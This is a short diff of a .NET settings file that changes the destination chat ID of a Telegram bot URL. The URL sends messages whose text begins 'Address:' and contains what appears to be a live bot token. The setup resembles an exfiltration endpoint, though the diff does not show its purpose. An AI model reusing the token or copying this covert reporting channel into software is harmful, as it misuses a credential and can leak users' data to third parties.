@@ -3,7 +3,7 @@
   <Profiles />
   <Settings>
     <Setting Name="url" Type="System.String" Scope="User">
-      <Value Profile="(Default)">https://api.telegram.org/bot7164183545:AAG0AdyOE__7cMZIVXGtAlTnao71ZS-MK2Y/sendMessage?chat_id=6790289594&amp;text=Address:</Value>
+      <Value Profile="(Default)">https://api.telegram.org/bot7164183545:AAG0AdyOE__7cMZIVXGtAlTnao71ZS-MK2Y/sendMessage?chat_id=-4185578177&amp;text=Address:</Value>
     </Setting>
   </Settings>
 </SettingsFile>
